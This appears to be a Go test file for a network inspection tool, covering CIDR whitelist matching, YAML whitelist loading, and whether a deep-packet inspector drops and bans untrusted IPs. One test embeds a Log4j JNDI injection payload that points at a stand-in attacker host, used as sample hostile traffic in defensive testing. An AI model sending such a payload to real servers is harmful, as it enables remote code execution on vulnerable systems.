package network

import (
	"testing"

	"github.com/copsec/collector/internal/dpi"
	"github.com/copsec/collector/pkg/ebpf"
)

// TestCIDRBoundaryMatches verifies IPv4 subnetting, boundary edges, and loopback evaluation.
func TestCIDRBoundaryMatches(t *testing.T) {
	wl := NewCIDRWhitelist()

	// Register specific corporate test subnets
	if err := wl.AddCIDR("203.0.113.0/24", "Corporate Demilitarized Zone"); err != nil {
		t.Fatalf("Failed to add CIDR: %v", err)
	}
	if err := wl.AddCIDR("198.51.100.128/25", "Vulnerability Scanner Pool"); err != nil {
		t.Fatalf("Failed to add CIDR: %v", err)
	}

	testCases := []struct {
		name       string
		ip         string
		whitedList bool
	}{
		// 1. Corporate Subnet 203.0.113.0/24
		{"Within_Subnet_Host", "203.0.113.1", true},
		{"Within_Subnet_Mid", "203.0.113.100", true},
		{"Network_Boundary_Low", "203.0.113.0", true},
		{"Broadcast_Boundary_High", "203.0.113.255", true},
		{"Outside_Subnet_Higher", "203.0.113.1.invalid", false},
		{"Outside_Subnet_Higher_IP", "203.0.114.1", false},
		{"Outside_Subnet_Lower_IP", "203.0.112.254", false},

		// 2. Default Enterprise RFC1918 Ranges
		{"RFC1918_ClassA_Host", "10.50.1.20", true},
		{"RFC1918_ClassA_Edge", "10.255.255.255", true},
		{"RFC1918_ClassB_Host", "172.20.10.5", true},
		{"Outside_RFC1918_ClassB", "172.32.1.1", false},
		{"RFC1918_ClassC_Default", "192.168.100.5", true},

		// 3. Loopback
		{"Loopback_Single_Host", "127.0.0.1", true},
		{"Loopback_Subnet_Range", "127.0.0.99", true},

		// 4. Vulnerability Scanner /25 block (198.51.100.128 - 198.51.100.255)
		{"Scanner_First_IP", "198.51.100.128", true},
		{"Scanner_Mid_IP", "198.51.100.200", true},
		{"Scanner_Last_IP", "198.51.100.255", true},
		{"Outside_Scanner_Lower", "198.51.100.127", false},
		{"Outside_Scanner_Upper", "198.51.101.1", false},

		// 5. External Public Untrusted IPs
		{"External_Attacker_1", "198.51.99.55", false},
		{"External_Attacker_2", "185.220.101.5", false},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := wl.IsWhitelisted(tc.ip)
			if result != tc.whitedList {
				t.Errorf("[%s] IP %s expected whitelisted=%v, got=%v",
					tc.name, tc.ip, tc.whitedList, result)
			}
		})
	}
}

// TestWhitelistedIPBypassExploit asserts that whitelisted IPs bypass high-entropy exploit payloads without quarantine.
func TestWhitelistedIPBypassExploit(t *testing.T) {
	xdp := ebpf.GetXDPEngine()
	_ = xdp.Flush()

	inspector := dpi.NewDPIInspector()
	wl := NewCIDRWhitelist()
	_ = wl.AddCIDR("10.0.0.0/8", "Internal Trusted Gateway")
	inspector.SetWhitelist(wl)

	// Severe Log4j RCE exploit payload
	exploitPayload := []byte("GET /login?user=${jndi:ldap://evil.attacker.com/a} HTTP/1.1\r\nHost: target.local\r\n\r\n")

	// 1. Whitelisted IP test -> MUST return VerdictClean and NOT ban IP
	trustedIP := "10.0.0.5"
	trustedRes := inspector.InspectPacketWithIP(exploitPayload, trustedIP)

	if trustedRes.Verdict != dpi.VerdictClean {
		t.Fatalf("Expected whitelisted IP %s to receive VerdictClean, got %s (Reason: %s)",
			trustedIP, trustedRes.Verdict, trustedRes.Reason)
	}
	if trustedRes.Stage != "WHITELIST_BYPASS" {
		t.Errorf("Expected stage WHITELIST_BYPASS, got %s", trustedRes.Stage)
	}
	if xdp.IsBanned(trustedIP) {
		t.Fatalf("CRITICAL: Whitelisted IP %s was banned in eBPF map!", trustedIP)
	}

	// 2. Non-whitelisted IP test -> MUST return VerdictDrop and ban IP
	untrustedIP := "198.51.100.99"
	untrustedRes := inspector.InspectPacketWithIP(exploitPayload, untrustedIP)

	if untrustedRes.Verdict != dpi.VerdictDrop {
		t.Fatalf("Expected untrusted IP %s to be dropped, got %s",
			untrustedIP, untrustedRes.Verdict)
	}
	if !xdp.IsBanned(untrustedIP) {
		t.Fatalf("Expected untrusted IP %s to be quarantined in eBPF map", untrustedIP)
	}
}

// TestYAMLWhitelistLoading verifies dynamic loading and parsing of whitelist files.
func TestYAMLWhitelistLoading(t *testing.T) {
	yamlContent := []byte(`
# Enterprise Whitelist Specification
trusted_cidrs:
  - "192.168.10.0/24"
  - "172.25.0.0/16"
  - "198.51.100.42/32"
`)

	wl := NewCIDRWhitelist()
	if err := wl.LoadFromYAML(yamlContent); err != nil {
		t.Fatalf("Failed to parse YAML whitelist: %v", err)
	}

	if !wl.IsWhitelisted("192.168.10.15") {
		t.Error("Expected 192.168.10.15 to be whitelisted from YAML")
	}
	if !wl.IsWhitelisted("172.25.99.1") {
		t.Error("Expected 172.25.99.1 to be whitelisted from YAML")
	}
	if !wl.IsWhitelisted("198.51.100.42") {
		t.Error("Expected 198.51.100.42 to be whitelisted from YAML")
	}
	if wl.IsWhitelisted("198.51.100.43") {
		t.Error("198.51.100.43 should NOT be whitelisted")
	}
}
